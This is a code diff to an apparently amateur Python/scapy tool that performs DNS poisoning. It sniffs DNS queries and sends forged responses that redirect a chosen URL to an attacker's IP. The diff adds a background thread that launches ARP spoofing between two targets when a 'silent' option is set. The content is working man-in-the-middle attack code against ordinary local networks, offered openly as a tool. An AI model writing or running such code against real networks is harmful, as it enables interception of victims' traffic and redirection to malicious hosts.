@@ -2,6 +2,7 @@ import sys
 import time
 import threading
 from scapy.all import *
+from ArpSpoofing import ArpSpoofing
 
 class DnsPoisoning:
     interface = 0
@@ -32,8 +33,21 @@ class DnsPoisoning:
                             send(poisonPacket, verbose=0, iface=interface)
                             print("Fake packet sent")
 
-        while True:
-            for ip in target1:
-                sniff(count=1, store=0, prn=lambda pkt: makeFakeResponse(pkt, ip, url, ipPoison, self.interface),iface=self.interface)
+        if silent:
+            print("Sorry, not implemented")
+            arpSpoofing = ArpSpoofing(self.interface)
+            try:
+                print("before thread")
+                arpSpoof = threading.Thread(name="arpThread", target=arpSpoofing.doSpoof,
+                                            args=(target1, target2, target1MAC, target2MAC, oneWay, silent, timeSleep))
+                arpSpoof.daemon = True
+                arpSpoof.start()
+                print("after thread")
+            except:
+                print("Thread arp failed to start")
+        else:
+            while True:
+                for ip in target1:
+                    sniff(count=1, store=0, prn=lambda pkt: makeFakeResponse(pkt, ip, url, ipPoison, self.interface),iface=self.interface)
 
         # print("You are poisoned")
